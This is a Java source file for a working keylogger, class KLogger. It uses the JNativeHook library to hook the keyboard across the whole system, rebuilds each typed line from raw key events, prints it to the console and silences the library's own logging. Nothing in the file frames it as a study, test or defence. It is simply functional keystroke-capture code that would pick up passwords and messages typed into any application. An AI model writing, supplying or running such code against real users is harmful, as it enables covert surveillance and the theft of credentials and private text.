import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class KLogger implements NativeKeyListener {

    StringBuffer input = new StringBuffer("");
    boolean shiftPressed = false;

    public KLogger() throws IOException {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        String key = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        if (key.equals("Enter")) {
            System.out.println("");
            System.out.println(input);
            input.delete(0,input.length());
        } else if (key.equals("Space")) {
            input.append(" ");
        } else if (key.equals("Backspace")) {
            if (input.length() > 0) { input.deleteCharAt(input.length()-1); }
        } else if (key.equals("Left Shift") || key.equals("Right Shift")) {
            shiftPressed = true;
        } else {
            if (!shiftPressed) key = key.toLowerCase();
            input.append("" + key);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        String key = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        if (key.equals("Left Shift") || key.equals("Right Shift")) shiftPressed = false;
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        // do nothing
    }

    public static void main(String args[]) throws IOException, NativeHookException {
        LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        GlobalScreen.registerNativeHook();
        KLogger kLogger = new KLogger();
        GlobalScreen.addNativeKeyListener(kLogger);
    }

}